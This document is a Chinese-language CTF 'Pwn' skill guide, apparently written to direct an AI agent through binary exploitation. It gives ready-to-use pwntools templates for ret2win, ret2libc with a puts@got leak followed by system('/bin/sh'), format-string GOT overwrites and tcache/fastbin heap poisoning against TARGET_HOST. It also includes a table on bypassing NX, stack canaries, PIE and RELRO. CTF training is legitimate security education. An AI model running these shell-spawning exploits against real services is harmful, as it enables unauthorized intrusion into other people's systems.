# Pwn / 二进制漏洞利用 Skill — CTF Binary 题全流程指引

## 适用场景
CTF Pwn / Binary Exploitation 类题目，包括栈溢出、堆利用、格式化字符串、ROP 链、ret2libc、ret2shellcode、整数溢出等。

---

## 阶段一：二进制分析

### 1.1 基础信息收集
```bash
# 文件类型
file ./challenge

# 架构和位数
checksec --file ./challenge 2>/dev/null || python3 -c "from pwn import *; print(ELF('./challenge').checksec())"

# 安全机制检查（NX/PIE/Canary/RELRO）
python3 -c "
from pwn import *
e = ELF('./challenge')
print('Arch:', e.arch)
print('RELRO:', e.relro)
print('Stack Canary:', e.canary)
print('NX:', e.nx)
print('PIE:', e.pie)
print('RPATH:', e.rpath)
"
```

### 1.2 安全机制含义速查

| 保护 | 开启时影响 | 绕过思路 |
|------|-----------|---------|
| **NX** | 栈/堆不可执行 | ROP / ret2libc / ret2syscall |
| **Canary** | 栈溢出被检测 | 泄露 canary / 格式化字符串读取 / 爆破（fork 场景） |
| **PIE** | 代码段地址随机 | 泄露地址后计算偏移 / partial overwrite |
| **Full RELRO** | GOT 表只读 | 无法覆写 GOT，改用 __malloc_hook / __free_hook |

### 1.3 字符串和函数识别
```bash
# 查找关键字符串
strings ./challenge | grep -iE "flag|password|secret|shell|bin/sh|/bin/cat"

# 查找危险函数
python3 -c "
from pwn import *
e = ELF('./challenge')
dangerous = ['gets', 'scanf', 'strcpy', 'sprintf', 'system', 'execve', 'read', 'printf']
for func in dangerous:
    if func in e.plt:
        print(f'PLT: {func} @ {hex(e.plt[func])}')
    if func in e.got:
        print(f'GOT: {func} @ {hex(e.got[func])}')
for func in e.symbols:
    if 'win' in func.lower() or 'flag' in func.lower() or 'shell' in func.lower() or 'backdoor' in func.lower():
        print(f'SYM: {func} @ {hex(e.symbols[func])}')
"

# 反汇编关键函数
python3 -c "
from pwn import *
e = ELF('./challenge')
# 找 main 函数
if 'main' in e.symbols:
    print(e.disasm(e.symbols['main'], 200))
"
```

---

## 阶段二：漏洞利用

### 2.1 栈溢出 — ret2win
```python
from pwn import *

elf = ELF('./challenge')
# p = process('./challenge')
p = remote('TARGET_HOST', TARGET_PORT)

# 找 win/flag/shell 函数
win_addr = elf.symbols.get('win') or elf.symbols.get('flag') or elf.symbols.get('shell')

# 确定偏移量：先用 cyclic 找
# cyclic 200 | ./challenge → 看 crash 地址
# cyclic_find(CRASH_ADDR)

offset = 40  # 根据实际调整
payload = b'A' * offset + p64(win_addr)

p.sendline(payload)
p.interactive()
```

### 2.2 栈溢出 — ret2libc（NX 开启）
```python
from pwn import *

elf = ELF('./challenge')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # 本地 libc，远程可能不同
# p = process('./challenge')
p = remote('TARGET_HOST', TARGET_PORT)

# 泄露 libc 地址（通过 puts@plt 打印 puts@got）
pop_rdi = 0x0  # ROPgadget --binary ./challenge --only 'pop|ret' | grep rdi
ret = 0x0      # 栈对齐用

payload1 = b'A' * offset
payload1 += p64(pop_rdi) + p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])  # 返回 main 再次利用

p.sendline(payload1)
p.recvuntil(b'\n')  # 接收到泄露的地址
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'Leaked puts: {hex(leaked)}')

# 计算 libc 基址
libc.address = leaked - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')

# 第二次利用：system("/bin/sh")
binsh = next(libc.search(b'/bin/sh'))
payload2 = b'A' * offset
payload2 += p64(ret)  # 栈对齐
payload2 += p64(pop_rdi) + p64(binsh)
payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()
```

### 2.3 格式化字符串漏洞
```python
from pwn import *

elf = ELF('./challenge')
p = remote('TARGET_HOST', TARGET_PORT)

# 检测偏移：发送 AAAA%p.%p.%p.%p...
# 找到 0x41414141 出现的位置即为偏移

# 读取任意地址（如 GOT 表）
target_addr = elf.got['puts']
# 假设偏移为 6
payload = p64(target_addr) + b'%6$s'

# 写入任意地址（覆写 GOT）
# 使用 pwntools 的 fmtstr_payload
payload = fmtstr_payload(offset=6, writes={elf.got['printf']: elf.symbols['system']})
```

### 2.4 堆利用基础（UAF / Double Free）
```python
from pwn import *

p = remote('TARGET_HOST', TARGET_PORT)

def add(size, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', content)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    return p.recvline()

def edit(idx, content):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Content: ', content)

# tcache poisoning (glibc 2.31+)
# 1. alloc A, B (same size)
# 2. free B, free A → tcache: A → B
# 3. 改 A 的 fd → target
# 4. alloc → A, alloc → target

# fastbin double free (glibc < 2.31)
# free(A), free(B), free(A)
# alloc(target_addr), alloc(), alloc() → 在 target 分配
```

---

## 阶段三：常用 ROP Gadget 查找

```bash
# 查找 gadgets
ROPgadget --binary ./challenge --only 'pop|ret'
ROPgadget --binary ./challenge --only 'syscall'
ROPgadget --binary ./challenge | grep "pop rdi"

# one_gadget（libc 中一步 getshell）
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

---

## 阶段四：远程利用注意事项

```python
# 远程连接
p = remote('TARGET_HOST', TARGET_PORT)

# 发送后接收 flag
p.sendline(payload)
output = p.recvall(timeout=5)
flag = re.search(rb'flag\{[^}]+\}|NSSCTF\{[^}]+\}', output)
if flag:
    print("FLAG:", flag.group().decode())
```

---

## 常见坑与排错

| 现象 | 可能原因 | 对策 |
|------|---------|------|
| 本地成功远程失败 | libc 版本不同 | 泄露 libc 地址，用 libc-database 查版本 |
| Segfault on system() | 栈未对齐（x86_64） | 在 system 前加一个 ret gadget |
| Canary 检测到 | 需要先泄露 canary | 格式化字符串读 / 爆破 |
| PIE 地址随机 | 需要信息泄露 | partial overwrite / 泄露后计算 |
| 堆利用 tcache key 校验失败 | glibc 2.32+ 有 key 检查 | 覆写 key 字段或用 House of 系列 |
